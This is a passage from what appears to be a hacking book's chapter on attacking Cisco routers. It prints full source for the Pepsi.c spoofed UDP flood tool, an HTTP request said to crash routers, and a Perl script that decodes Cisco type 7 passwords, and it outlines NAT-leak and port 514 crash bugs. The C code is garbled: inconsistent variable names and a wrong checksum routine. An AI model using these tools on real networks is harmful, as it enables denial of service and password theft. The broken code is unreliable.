
![](img/ba85bb40c695c02adae8cbd6666f2e0c_469_0.png)

**Figure 9.4** Pepsi for DOS.

**Breach:** Consistent scanning while asserting the telnet ENVIRON option before the router is ready to accept it causes a system crash. Also, sending packets to the router's syslog port (UDP port 514) will cause some of these systems to crash as well. Common DoS attacks frequently encountered are TCP SYN floods and UDP floods, aimed at diagnostic ports. As described earlier, TCP SYN attacks consist of a large number of spoofed TCP connection setup messages aimed at a particular service on a host. Keep in mind that older TCP implementations cannot handle many impostor packets, and will not allow access to the victim service. The most common form of UDP flooding is an attack consisting of a large number of spoofed UDP packets aimed at diagnostic ports on network devices. This attack is also known as the Soldier pepsi.c attack, shown next and in Figure 9.4.

## Pepsi.c

```c
#define FRIEND "My christmas present to the Internet -Soldier"
#define VERSION "Pepsi.c v1.7"
#define DSTPORT 7
#define SRCPORT 19
#define PSIZE 1024
#define DWAIT 1
/*
 *
 * Includes
 */
#include <fcntl.h>
#include <syslog.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <netconfig.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <signal.h>
#include <netinet/udp.h>
#include <string.h>
#include <pwd.h>
/*
 * Banner.
 */
void banner()
{
    printf( "\t\t\t%s Author - Soldier \n", VERSION );
    printf( "\t\t\t [10.27.97] \n\n" );
    printf( "This Copy Register to: %s\n\n", FRIEND );
}
/*
 * Option parsing.
 */
struct sockaddr_in dstaddr;
unsigned long dst;
struct udphdr *udp;
struct ip *ip;
char *target;
char *srchost;
int dstport = 0;
int srcport = 0;
int numpacks = 0;
int psize = 0;
int wait = 0;
void usage(char *pname)
{
    printf( "Usage:\n " );
    printf( "%s [-s src] [-n num] [-p size] [-d port] [-o port] [-w <dest>\n\n", pname );
    printf( "\t-s <src> : source where packets are coming from\n" );

    printf( "\t-n <num> : number of UDP packets to send\n" );
    printf( "\t-p <size> : Packet size [Default is 1024]\n" );
    printf( "\t-d <port> : Destination port [Default is %.2d]\n", DSTPORT );
    printf( "\t-o <port> : Source port [Default is %.2d]\n", SRCPORT );
    printf( "\t-w <time> : Wait time between pkts [Default is 1]\n" );
    printf( "\t<dest> : Destination\n" );
    printf( "\n" );
    exit(EXIT_SUCCESS);
}
/*
* Checksum code, Soldier's original stuff.
*/
unsigned short in_cksum(u_short *addr, int len)
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;
    while (nleft > 1 )
    {
        sum += *w++;
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1)
    {
        *(u_char *)(&answer) = *(u_char *)w;
        sum += answer;
    }
    sum = (sum >> 17) + (sum & 0xffff);
    sum += (sum >> 17);
    answer = -sum;
    return (answer);
}
void main(int argc, char *argv[])
{
    int sen;
    int i;
    int unlim = 0;
    int sec_check;
    int opt;
    char *packet;
    struct hostent *host = NULL;
    unsigned long a;
    /*
    * Display the banner to begin with.
    */
    banner();
    /*
    * Debugging options.
    */
    openlog( "PEPSI", 0, LOG_LOCAL5 );
    if (argc < 2)
        usage(argv[0]);
    while ((opt = getopt(argc, argv, "s:d:n:p:w:o:")) != EOF)
    {
        switch(opt)
        {
            case 's':
                srghost = (char *)malloc(strlen(optarg) + 1);
                strcpy(srghost, optarg);
                break;
            case 'd':
                dstport = atoi(optarg);
                break;
            case 'n':
                numpacks = atoi(optarg);
                break;
            case 'p':
                psize = atoi(optarg);
                break;
            case 'w':
                wait = atoi(optarg);
                break;
            case 'o':
                srcport = atoi(optarg);
                break;
            default:
                usage(argv[0]);
                break;
        }
        if (!dstport)
        {
            dstport = DSTPORT;
        }
        if (!srcport)
        {
            srcport = SRCPORT;
        }
        if (!psize)
        {
            psize = PSIZE;
        }
        if (!argv[optind])
        {
            puts( "[*] Specify a target host, doof!" );
            exit(EXIT_FAILURE);
        }

        target = (char *)malloc(strlen(argv[optind]));
        if (!target)
        {
            puts( "[*] Agh! Out of memory!" );
            perror( "malloc" );
            exit(EXIT_FAILURE);
        }
        strcpy(target, argv[optind]);
    }
    memset(&dstaddr, 0, sizeof(struct sockaddr_in));
    dstaddr.sin_family = AF_INET;
    dstaddr.sin_addr.s_addr = inet_addr(target);
    if (dstaddr.sin_addr.s_addr == -1)
    {
        host = gethostbyname(target);
        if (host == NULL)
        {
            printf("[*] Unable to resolve %s\t\n", target);
            exit(EXIT_FAILURE);
        }

        dstaddr.sin_family = host->h_addrtype;
        memcpy(&(caddr_t) &dstaddr.sin_addr, host->h_addr, host->h_length);
    }
    memcpy(&dst, (char *)&dstaddr.sin_addr.s_addr, 4);
    printf("# Target Host : %s\n", target);
    printf("# Source Host : %s\n",
            srhost && *srhost ? srhost : "Random");
    if(!numpacks)
        printf("# Number : Unlimited\n");
    else
        printf("# Number : %d\n", numpacks);
    printf("# Packet Size : %d\n", psize);
    printf("# Wait Time : %d\n", wait);
    printf("# Dest Port : %d\n", dstport);
    printf("# Source Port : %d\n", srcport);
    /*
     * Open a socket.
     */
    sen = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    packet = (char *)malloc(sizeof(struct ip) + sizeof(struct udphdr) + psize);
    ip = (struct ip *)packet;
    udp = (struct udphdr *)(packet + sizeof(struct ip));
    memset(packet, 0, sizeof(struct ip) + sizeof(struct udphdr) + psize);
    if(!numpacks)
    {
        unlim++;
        numpacks++;
    }
    if(srhost && *srhost)
    {
        if(!(host = gethostbyname(srhost)))
        {
            printf("[*] Unable to resolve %s\t\n", srhost);
            syslog(LOG_NOTICE, "Unable to resolve [%s]", srhost);
            exit(EXIT_FAILURE);
        }
        else
        {
            ip->ip_src.s_addr = ((unsigned long)host->h_addr);
            syslog(LOG_NOTICE, "IP source is [%s]", host->h_name);
        }
    }
    ip->ip_dst.s_addr = dst;
    ip->ip_v = 4;
    ip->ip_hl = 5;
    ip->ip_ttl = 255;
    ip->ip_p = IPPROTO_UDP;
    ip->ip_len = htons(sizeof(struct ip) + sizeof(struct udphdr) + psize);
    ip->ip_sum = in_cksum(ip, sizeof(struct ip));
    udp->uh_sport = htons(srcport);
    udp->uh_dport = htons(dstport);
    udp->uh_ulen = htons(sizeof(struct udphdr) + psize);
    for (i=0; i<numpacks; (unlim) ? i++, i-- : i++)
    {
        if (!srchost)
        {
            ip->ip_src.s_addr = (unsigned long)rand();
            syslog( LOG_NOTICE, "IP source set randomly.");
        }
        if (sendto (sen, packet, sizeof(struct ip) + sizeof(struct udphdr) + psize, 0, (struct sockaddr *) &dstaddr, sizeof(struct sockaddr_in)) == (-1))
        {
            puts( "[*] Error sending packet." );
            perror( "Sendpacket" );
            exit(EXIT_FAILURE); 
        }
        usleep(wait);
    }
    syslog( LOG_NOTICE, "Sent %d packets to [%s]", numpacks, target );
}
```

## HTTP DoS Attack

**Synopsis:** There is an HTTP DoS vulnerability in Cisco family access products.

**Hack State:** Unauthorized access and/or system crash.

**Vulnerabilities:** Access routers.

**Breach:** Cisco routers have a built-in feature that allows administrators to monitor them remotely. When this feature is enabled, it is possible to cause an HTTP DoS attack against the router by issuing a simple request. This request will cause the router to stop responding until the unit is reset:

```
http:///%%
```

## IOS Password Cracker

**Synopsis:** There is potential exposure of Cisco internetworking operating system (IOS) passwords.

**Hack State:** Password crack.

**Vulnerabilities:** Access routers.

**Breach:** CrackIOS.pl

### CrackIOS.pl

```perl
@xlat = ( 0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41,
          0x2c, 0x2e, 0x69, 0x79, 0x65, 0x77, 0x72, 0x6b, 0x6c,
          0x64, 0x4a, 0x4b, 0x44, 0x48, 0x53, 0x55, 0x42 );

while (<>) {
    if ((password|md5)\s+7\s+([\da-f]+)\io) {
        if (! (length($2) & 1)) {
            $ep = $2; $dp = "";
            ($s, $e) = ($2 =~ /^(..)(.+)/o);
            for ($i = 0; $i < length($e); $i+=2) {
                $dp .= sprintf
                    "%c",hex(substr($e,$i,2))^$xlat[$s++];
            }
            s/$ep/$dp/;
        }
    }
    print;
}
# eof
```

## NAT Attack

**Synopsis:** Bugs in IOS software cause packet leakage between network address translation (NAT) and input access filters.

**Hack State:** Packet leakage.

**Vulnerabilities:** The following:

- Cisco routers in the 17xx family.
- Cisco routers in the 26xx family.
- Cisco routers in the 36xx family.
- Cisco routers in the AS58xx family (not the AS52xx or AS53xx).
- Cisco routers in the 72xx family (including the ubr72xx).
- Cisco routers in the RSP70xx family (not non-RSP 70xx routers).
- Cisco routers in the 75xx family.
- The Catalyst 5xxx Route-Switch Module (RSM).

**Breach:** Software bugs create a security breach between NAT and input access list processing in certain Cisco routers running 12.0-based versions of Cisco IOS software (including 12.0, 12.0S, and 12.0T, in all versions up to 12.04). This causes input access list filters to “leak” packets in certain NAT configurations.

## UDP Scan Attack

**Synopsis:** Performing a UDP scan on Port 514 causes a system crash on some routers running IOS software version 12.0.

**Hack State:** System crash.
